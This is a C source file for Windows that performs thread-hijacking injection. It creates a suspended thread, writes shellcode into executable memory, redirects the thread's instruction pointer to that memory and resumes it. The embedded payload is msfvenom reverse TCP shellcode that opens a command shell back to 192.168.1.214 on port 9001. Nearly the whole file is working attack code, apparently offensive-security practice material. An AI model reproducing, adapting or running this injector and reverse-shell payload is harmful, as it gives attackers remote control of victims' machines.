#include <Windows.h>
#include "misc.h"


BOOL classicThreadHijacking(IN HANDLE hThread, IN PBYTE pbPayload, IN SIZE_T sPayload) {

	PVOID pAddress = NULL;
	DWORD dwOldProtection = NULL;
	BOOL bRet = FALSE;

	CONTEXT ThreadCtx;
	ThreadCtx.ContextFlags = CONTEXT_CONTROL;


	wprintf(L"[>] Classic Thread injection: START\n");

	do {
		wprintf(L"\t[i] Allocating memory for payload... ");
		pAddress = VirtualAlloc(NULL, sPayload, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
		if (pAddress == NULL)
		{
			printError(L"VirtualAlloc");
			break;
		}
		wprintf(L"done, 0x%p\n", pAddress);

		wprintf(L"\t[i] Copying payload... ");
		memcpy(pAddress, pbPayload, sPayload);
		wprintf(L"done\n");

		wprintf(L"\t[i] Adding execution rights... ");
		bRet = VirtualProtect(pAddress, sPayload, PAGE_EXECUTE_READWRITE, &dwOldProtection);
		if (!bRet)
		{
			printError(L"VirtualProtect");
			break;
		}
		wprintf(L"done\n");

		wprintf(L"\t[i] Getting thread context... ");
		bRet = GetThreadContext(hThread, &ThreadCtx);
		if (!bRet)
		{
			printError(L"GetThreadContext");
			break;
		}
		wprintf(L"done\n");

		wprintf(L"\t[i] Setting RIP to point payload buffer... ");
		ThreadCtx.Rip = (DWORD64)pAddress;
		wprintf(L"done\n");

		wprintf(L"\t[i] Updating the new thread context... ");
		bRet = SetThreadContext(hThread, &ThreadCtx);
		if (!bRet)
		{
			printError(L"SetThreadContext");
			break;
		}
		wprintf(L"done\n");

		wprintf(L"[<] Classic Thread injection: DONE\n");
		return TRUE;

	} while (FALSE);

	wprintf(L"[<] Classic Thread injection: FAILED\n");
	return FALSE;
}

int main()
{
	// msfvenom -p windows/x64/shell_reverse_tcp LHOST=192.168.1.214 LPORT=9001 -f c
	BYTE pbPayload[] =
		"\xfc\x48\x83\xe4\xf0\xe8\xc0\x00\x00\x00\x41\x51\x41\x50"
		"\x52\x51\x56\x48\x31\xd2\x65\x48\x8b\x52\x60\x48\x8b\x52"
		"\x18\x48\x8b\x52\x20\x48\x8b\x72\x50\x48\x0f\xb7\x4a\x4a"
		"\x4d\x31\xc9\x48\x31\xc0\xac\x3c\x61\x7c\x02\x2c\x20\x41"
		"\xc1\xc9\x0d\x41\x01\xc1\xe2\xed\x52\x41\x51\x48\x8b\x52"
		"\x20\x8b\x42\x3c\x48\x01\xd0\x8b\x80\x88\x00\x00\x00\x48"
		"\x85\xc0\x74\x67\x48\x01\xd0\x50\x8b\x48\x18\x44\x8b\x40"
		"\x20\x49\x01\xd0\xe3\x56\x48\xff\xc9\x41\x8b\x34\x88\x48"
		"\x01\xd6\x4d\x31\xc9\x48\x31\xc0\xac\x41\xc1\xc9\x0d\x41"
		"\x01\xc1\x38\xe0\x75\xf1\x4c\x03\x4c\x24\x08\x45\x39\xd1"
		"\x75\xd8\x58\x44\x8b\x40\x24\x49\x01\xd0\x66\x41\x8b\x0c"
		"\x48\x44\x8b\x40\x1c\x49\x01\xd0\x41\x8b\x04\x88\x48\x01"
		"\xd0\x41\x58\x41\x58\x5e\x59\x5a\x41\x58\x41\x59\x41\x5a"
		"\x48\x83\xec\x20\x41\x52\xff\xe0\x58\x41\x59\x5a\x48\x8b"
		"\x12\xe9\x57\xff\xff\xff\x5d\x49\xbe\x77\x73\x32\x5f\x33"
		"\x32\x00\x00\x41\x56\x49\x89\xe6\x48\x81\xec\xa0\x01\x00"
		"\x00\x49\x89\xe5\x49\xbc\x02\x00\x23\x29\xc0\xa8\x01\xd6"
		"\x41\x54\x49\x89\xe4\x4c\x89\xf1\x41\xba\x4c\x77\x26\x07"
		"\xff\xd5\x4c\x89\xea\x68\x01\x01\x00\x00\x59\x41\xba\x29"
		"\x80\x6b\x00\xff\xd5\x50\x50\x4d\x31\xc9\x4d\x31\xc0\x48"
		"\xff\xc0\x48\x89\xc2\x48\xff\xc0\x48\x89\xc1\x41\xba\xea"
		"\x0f\xdf\xe0\xff\xd5\x48\x89\xc7\x6a\x10\x41\x58\x4c\x89"
		"\xe2\x48\x89\xf9\x41\xba\x99\xa5\x74\x61\xff\xd5\x48\x81"
		"\xc4\x40\x02\x00\x00\x49\xb8\x63\x6d\x64\x00\x00\x00\x00"
		"\x00\x41\x50\x41\x50\x48\x89\xe2\x57\x57\x57\x4d\x31\xc0"
		"\x6a\x0d\x59\x41\x50\xe2\xfc\x66\xc7\x44\x24\x54\x01\x01"
		"\x48\x8d\x44\x24\x18\xc6\x00\x68\x48\x89\xe6\x56\x50\x41"
		"\x50\x41\x50\x41\x50\x49\xff\xc0\x41\x50\x49\xff\xc8\x4d"
		"\x89\xc1\x4c\x89\xc1\x41\xba\x79\xcc\x3f\x86\xff\xd5\x48"
		"\x31\xd2\x48\xff\xca\x8b\x0e\x41\xba\x08\x87\x1d\x60\xff"
		"\xd5\xbb\xf0\xb5\xa2\x56\x41\xba\xa6\x95\xbd\x9d\xff\xd5"
		"\x48\x83\xc4\x28\x3c\x06\x7c\x0a\x80\xfb\xe0\x75\x05\xbb"
		"\x47\x13\x72\x6f\x6a\x00\x59\x41\x89\xda\xff\xd5";
	
	SIZE_T sPayload = (sizeof(pbPayload) / sizeof(BYTE)) - 1;

	HANDLE hThread = NULL;
	BOOL bRet = FALSE;
	DWORD dwThreadCount = 0;

	LPTHREAD_START_ROUTINE DummyFunction = NULL;


	do {
		wprintf(L"[i] Create sacrifice thread... ");
		hThread = CreateThread(NULL, NULL, (LPTHREAD_START_ROUTINE)&DummyFunction, NULL, CREATE_SUSPENDED, NULL);
		if (hThread == NULL)
		{
			printError(L"CreateThread");
			break;
		}
		wprintf(L"done, 0x%p\n", hThread);

		bRet = classicThreadHijacking(hThread, pbPayload, sPayload);
		if (!bRet)
		{
			break;
		}

		wprintf(L"[i] Resuming modified thread... ");
		dwThreadCount = ResumeThread(hThread);
		if (dwThreadCount == (DWORD)-1)
		{
			printError(L"ResumeThread");
			break;
		}
		wprintf(L"done\n");

		return 0;

	} while (FALSE);

	return -1;
}